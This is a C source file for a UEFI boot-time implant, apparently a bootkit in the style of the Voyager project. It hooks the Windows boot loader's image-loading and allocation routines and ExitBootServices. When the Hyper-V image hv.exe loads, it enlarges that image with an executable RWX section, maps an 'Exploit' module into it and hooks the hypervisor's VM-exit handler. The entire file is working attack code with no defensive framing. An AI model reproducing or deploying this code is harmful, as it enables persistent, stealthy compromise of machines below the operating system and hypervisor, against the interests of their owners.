#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/ShellLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <IndustryStandard/PeImage.h>
#include "Utils.h"
#include "InlineHook.h"
#include "WinLoad.h"
#include "Hv.h"
#include "Exploit.h"

static BOOLEAN HyperVloading = FALSE;
static BOOLEAN InstalledHvLoaderHook = FALSE;
static BOOLEAN ExtendedAllocation = FALSE;
static BOOLEAN HookedHyperV = FALSE;
static BOOLEAN IsLoaded = FALSE;
UINT64 AllocationCount = 0;
INLINE_HOOK WinLoadImageShitHook = { 0 };
INLINE_HOOK WinLoadAllocateImageHook = { 0 };
EFI_EXIT_BOOT_SERVICES ExitBootServicesOriginal = NULL;

EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE imageHandle, UINTN mapKey)
{
	if (IsLoaded == TRUE)
	{
		Print(L"Strain..\n");
	}
	gBS->ExitBootServices = ExitBootServicesOriginal;
	return gBS->ExitBootServices(imageHandle, mapKey);
}

EFI_STATUS EFIAPI BlLdrLoadImage(VOID* Arg1, CHAR16* ModulePath, CHAR16* ModuleName, VOID* Arg4, VOID* Arg5, VOID* Arg6, VOID* Arg7, PPLDR_DATA_TABLE_ENTRY lplpTableEntry, VOID* Arg9, VOID* Arg10, VOID* Arg11, VOID* Arg12, VOID* Arg13, VOID* Arg14, VOID* Arg15, VOID* Arg16)
{
	if (!StrCmp(ModuleName, L"hv.exe"))
		HyperVloading = TRUE;

	DisableInlineHook(&WinLoadImageShitHook);
	EFI_STATUS Result = ((LDR_LOAD_IMAGE)WinLoadImageShitHook.Address)(Arg1, ModulePath, ModuleName, Arg4, Arg5, Arg6, Arg7, lplpTableEntry, Arg9, Arg10, Arg11, Arg12, Arg13, Arg14, Arg15, Arg16);
	if (!HookedHyperV)
		EnableInlineHook(&WinLoadImageShitHook);

	if (!StrCmp(ModuleName, L"hv.exe"))
	{
		HookedHyperV = TRUE;
		VOYAGER_T LocalData;
		PLDR_DATA_TABLE_ENTRY TableEntry = *lplpTableEntry;
		MakeVoyagerData(&LocalData, (void*)TableEntry->ModuleBase, TableEntry->SizeOfImage, CreateExpSection((void*)TableEntry->ModuleBase, SETION_NAME, GetExpSize(), SECTION_RWX), GetExpSize());
		HookVmExit((void*)LocalData.HypervModuleBase, (void*)LocalData.HypervModuleSize, MapModule(&LocalData, ExpLoad));
		TableEntry->SizeOfImage = NT_HEADER(TableEntry->ModuleBase)->OptionalHeader.SizeOfImage;
		IsLoaded = TRUE;
	}
	return Result;
}

UINT64 EFIAPI BlImgAllocateImageBuffer(VOID** imageBuffer, UINTN imageSize, UINT32 memoryType, UINT32 attributes, VOID* unused, UINT32 Value)
{
	if (HyperVloading && !ExtendedAllocation && ++AllocationCount == 2)
	{
		ExtendedAllocation = TRUE;
		imageSize += GetExpSize();
		memoryType = BL_MEMORY_ATTRIBUTE_RWX;
	}
	DisableInlineHook(&WinLoadAllocateImageHook);
	UINT64 Result = ((ALLOCATE_IMAGE_BUFFER)WinLoadAllocateImageHook.Address)(imageBuffer, imageSize, memoryType, attributes, unused, Value);
	if (!ExtendedAllocation)
		EnableInlineHook(&WinLoadAllocateImageHook);

	return Result;
}